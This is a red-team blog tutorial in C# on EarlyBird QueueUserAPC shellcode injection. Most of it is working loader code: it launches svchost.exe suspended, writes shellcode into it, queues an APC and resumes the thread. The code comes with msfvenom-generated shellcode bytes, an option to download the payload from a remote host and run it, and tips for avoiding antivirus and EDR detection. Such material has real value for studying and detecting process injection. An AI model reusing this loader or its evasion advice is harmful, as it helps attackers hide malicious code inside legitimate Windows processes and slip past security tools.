---
title: "Shellcode Injection in C# - Part 3 - QueueUserAPC | EarlyBird"
author:
  name: crypt0ace
  link: https://twitter.com/crypt0acee
date: 2022-09-16
description: "Discussing shellcode injection techniques we can use while utilizing C#"
tags: [Red Team]
---
## Introduction
In this post we are going to look at another method for shellcode execution. THis involves using the API call `QueueUserAPC`. Like previous [Process Hollowing](https://crypt0ace.github.io/posts/Shellcode-Injection-Techniques-Part-2/), in this we are going to open a process in a suspended state, allocate some memory into it, write our shellcode into that allocated region, queue and APC to the thread and then resume it.

## QueueUserAPC
According to [Mitre](https://attack.mitre.org/techniques/T1055/004/) *APC injection is commonly performed by attaching malicious code to the APC Queue of a process's thread. Queued APC functions are executed when the thread enters an alterable state. A handle to an existing victim process is first created with native Windows API calls such as OpenThread. At this point QueueUserAPC can be used to invoke a function.*
<br>
APC stands for Asynchronous Procedure Call. APCs are functions that executes asynchronously in the context of a particular thread. Every thread has its own queue of APCs. They are executed in FIFO (First in first out) way when a thread enters an alertable state. A thread can enter an alertable state using calls like `SleepEx`. Explained by Microsoft [here](https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls)

## EarlyBird
In standard `QueueUserAPC` injection, all the threads are opened of a running process and the shellcode is binded with them in search that one of them will have a alertable state for it to execute our shellcode. This is unpredictable as it may not execute our shellcode or it may execute our shellcode multiple times.
<br>
In comes EarlyBird method. In this method, instead of targeting a running process we chose to create a process in a suspended state. After writing our shellcode to the thread we queue an APC and then resume the thread. This way the program processes the APC before the main thread executes. In some cases, it can bypass some EDRs/AVs because the execution of our shellcode happens before EDRs can hook in. (More into this later).

## .NET and APCs
While looking at some POCs of this method in C#, I noticed the code didnt have any "Alertable State" calls to actually execute the shellcode. Some research lead me to two articles. [One](https://posts.specterops.io/the-curious-case-of-queueuserapc-3f62e966d2cb) by SpecterOps and the [other](https://dev.to/wireless90/stealthy-code-injection-in-a-running-net-process-i5c) by wireless90. They explain how the CLR in .NET is responsible for this to happen.
<br>
TLDR is that the CLR calls an alertable method for us. The thread would be managed by the CLR and the shellcode executes when the .NET executeable exits.

### Imports
With all that theory out we can start with developing. First we need to set up the API calls we are going to use. For this some of the calls are obvious. First we need to create a process in a suspended state with `CreateProcess`. Then we allocate some RW space for our shellcode using `VirtualAllocEx`. Then we write the shellcode using `WriteProcessMemory`. Change the protection to RX USING `VirtualProtectEx`. Queue an APC to the main thread and then resume the thread. All put together looks like this.
```csharp
[DllImport("kernel32.dll")]
public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

[DllImport("kernel32.dll")]
public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref IntPtr lpNumberOfBytesWritten);

[DllImport("kernel32.dll")]
public static extern bool VirtualProtectEx(IntPtr handle, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

[DllImport("kernel32.dll")]
public static extern uint ResumeThread(IntPtr hThread);
```

We also need some structs like in the previous post.
```csharp
public struct STARTUPINFO
{
  public Int32 cb;
  public string lpReserved;
  public string lpDesktop;
  public string lpTitle;
  public Int32 dwX;
  public Int32 dwY;
  public Int32 dwXSize;
  public Int32 dwYSize;
  public Int32 dwXCountChars;
  public Int32 dwYCountChars;
  public Int32 dwFillAttribute;
  public Int32 dwFlags;
  public Int16 wShowWindow;
  public Int16 cbReserved2;
  public IntPtr lpReserved2;
  public IntPtr hStdInput;
  public IntPtr hStdOutput;
  public IntPtr hStdError;
}

[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION
{
  public IntPtr hProcess;
  public IntPtr hThread;
  public int dwProcessId;
  public int dwThreadId;
}

public static class CreationFlags
{
  public const uint SUSPENDED = 0x4;
}

public enum ThreadAccess : int
{
  SET_CONTEXT = 0x0010
}

public static readonly UInt32 MEM_COMMIT = 0x1000;
public static readonly UInt32 MEM_RESERVE = 0x2000;
public static readonly UInt32 PAGE_EXECUTE_READ = 0x20;
public static readonly UInt32 PAGE_READWRITE = 0x04;
```


### Main Method
First we need to initialize a couple of structs and then we can create a process in a suspended state much like in the previous post.
```csharp
STARTUPINFO si = new STARTUPINFO();
PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

string app = @"C:\Windows\System32\svchost.exe";
bool procinit = CreateProcess(null, app, IntPtr.Zero, IntPtr.Zero, false, CreationFlags.SUSPENDED, IntPtr.Zero, null, ref si, ref pi);
```

We can add our shellcode in. We have seen how to copy paste from `msfvenom`. We can also fetch the shellcode from web or read from disk. Not recommended reading shellcode from disk. Very bad OPSEC.
```csharp
// If you want to fetch the shellcode from the web
string url = "http://192.168.1.1/safe.bin";
WebClient wc = new WebClient();
byte[] buf = wc.DownloadData(url);

// If you want to load shellcode from disk
string shellpath = @"C:\Users\crypt0ace\Desktop\www\safe.bin";
byte[] buf = File.ReadAllBytes(shellpath);

// If you want to embed the shellcode
// msfvenom -p windows/x64/exec CMD=calc.exe -f csharp
byte[] buf = new byte[276] {
    0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
    0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
    0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
    0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
    0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
    0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
    0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
    0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
    0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
    0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
    0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
    0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
    0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
    0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
    0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
    0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
    0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
    0x63,0x2e,0x65,0x78,0x65,0x00 };
```

Make sure to comment out the method youre not using.
<br>
After starting the process we can allocate space for our shellcode. This time however we would be using READ/WRITE (RW) memory and not READ/WRITE/EXECUTE (RWX) because it creates more suspicion and is usually flagged by AVs.
```csharp
IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, buf.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

Once the memory has been allocated we can write our shellcode in it using `WriteProcessMemory`.
```csharp
IntPtr bytesWritten = IntPtr.Zero;
bool resultBool = WriteProcessMemory(pi.hProcess, resultPtr, buf, buf.Length, ref bytesWritten);
```

We can now change the memory protection using `VirtualProtectEx` to READ/EXECUTE (RX)
```csharp
uint oldProtect = 0;
IntPtr proc_handle = pi.hProcess;
resultBool = VirtualProtectEx(proc_handle, resultPtr, buf.Length, PAGE_EXECUTE_READ, out oldProtect);
```

After that we can use `QueueUserAPC` to queue and APC to our thread. We will provide the main thread using the `PROCESS_INFORMATION` struct's `hThread`.
```csharp
IntPtr ptr = QueueUserAPC(resultPtr, pi.hThread, IntPtr.Zero);
```

Resuming the thread using `ResumeThread` would put our APC to the front and execute the code in it before the main thread gets executed.
```csharp
IntPtr ThreadHandle = pi.hThread;
ResumeThread(ThreadHandle);
```

All goes well you should see the shellcode being executed.
![Calculator Pop](/assets/img/shellcode-injections-3/calc-pop.png)

## Code
The full code can be found on my github [here](https://github.com/crypt0ace/CS-APCInjection). Wont bypass any AV/EDR though but its a nice little technique for shellcode execution.

## References
As always all credits to these great posts

- [IRed.Team](https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection)
- [Mitre](https://attack.mitre.org/techniques/T1055/004/)
- [Kara-4search/EarlyBirdInjection_CSharp](https://github.com/Kara-4search/EarlyBirdInjection_CSharp)
- [SevroSecurity](https://sevrosecurity.com/2020/04/13/process-injection-part-2-queueuserapc/)
- [dosxuz/Process-Injections](https://github.com/dosxuz/Process-Injections)
- [3xpl01tc0d3r - Process Injections Part 5](https://3xpl01tc0d3r.blogspot.com/2019/12/process-injection-part-v.html)
- [0x00sec - Process Injection: APC Injection](https://0x00sec.org/t/process-injection-apc-injection/24608)
- [wireless90 - Stealthy Code Injection in a Running .NET Process](https://dev.to/wireless90/stealthy-code-injection-in-a-running-net-process-i5c)
- [Dwight Hohnstein - The Curious Case of QueueUserAPC](https://posts.specterops.io/the-curious-case-of-queueuserapc-3f62e966d2cb)